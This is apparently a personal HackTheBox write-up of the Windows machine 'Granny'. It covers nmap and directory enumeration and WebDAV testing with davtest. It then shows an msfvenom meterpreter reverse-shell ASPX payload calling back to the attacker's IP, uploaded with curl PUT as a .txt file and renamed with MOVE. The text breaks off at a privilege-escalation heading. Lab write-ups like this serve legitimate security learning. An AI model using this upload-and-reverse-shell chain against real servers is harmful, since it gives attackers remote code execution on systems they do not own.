### NMAP

```
sudo nmap -sC -vv -sV 10.10.10.15 -oN nmap-granny
```

![[HackTheBox/Windows/attachments/Pasted image 20250710222523.png]]


# Web (80)
![[HackTheBox/Windows/attachments/Pasted image 20250710222748.png]]
- IIS

## Ferox 
```
feroxbuster -u http://10.10.10.15/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o ferox.out
```

![[HackTheBox/Windows/attachments/Pasted image 20250710223000.png]]
- error

```
curl -X PUT -T "web-shell.php.png" "http://10.10.10.15/web-shell.php.png"
```

The shells with the double extension were uploading but the web page wasn't executing them.

![[HackTheBox/Windows/attachments/Pasted image 20250710233810.png]]

Grabbing hints...

It looks like we should be enumerating WebDAV server directly for these different methods

# WebDAV

```
davtest -url http://10.10.10.15
```

![[HackTheBox/Windows/attachments/Pasted image 20250710234131.png]]
- oh 👀

So basically txt files can be PUT on the server 
![[HackTheBox/Windows/attachments/Pasted image 20250710234532.png]]

But no php or asp or aspx can. 

We could use MOVE or COPY to change the file name to something that ends with .aspx and get command execution. 

The response of the box X-Powered-By: ASP.NET suggests that executing an ASPX file should work.

Generate aspx payload with msfvenom 

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=9001 -f aspx -o rev.aspx
```


![[HackTheBox/Windows/attachments/Pasted image 20250711000046.png]]

The put this aspx file on the server as a txt file and MOVE the aspx in

```
sudo curl -X PUT http://10.10.10.15/rev.txt --data-binary @rev.aspx
```

```
sudo curl -X MOVE -H 'Destination: http://10.10.10.15/rev.aspx' http://10.10.10.15/rev.txt
```


Ahhh losing my shell

![[HackTheBox/Windows/attachments/Pasted image 20250711001047.png]]

Maybe netcat can't handle?

I will use metasploit's multi/handler

```
msfconsole -q
```

```
use exploit/multi/handler
```

Set the payload to the same as the msfvenom script

![[HackTheBox/Windows/attachments/Pasted image 20250711001759.png]]

```
set payload windows/meterpreter/reverse_tcp
```

Set lhost and lport to kali box 

![[HackTheBox/Windows/attachments/Pasted image 20250711002054.png]]

Start the handler. Visit the aspx in the browser 

![[HackTheBox/Windows/attachments/Pasted image 20250711002141.png]]


Yay! Initial access!

![[HackTheBox/Windows/attachments/Pasted image 20250711002218.png]]

# Privesc with Metasploit